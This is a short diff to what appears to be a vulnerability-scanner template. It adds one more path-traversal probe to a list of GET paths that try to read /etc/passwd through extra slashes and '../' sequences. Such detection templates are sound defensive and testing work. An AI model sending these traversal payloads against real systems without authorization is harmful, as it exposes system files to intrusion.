@@ -20,6 +20,7 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}///////../../../etc/passwd"
+      - "{{BaseURL}}////////////////////////../../../../../../../../etc/passwd"
       - "{{BaseURL}}/static///////../../../../etc/passwd"
       - "{{BaseURL}}////////////////../../../../../../../../etc/passwd"
       - "{{BaseURL}}/static////////////////../../../../../../../../etc/passwd"
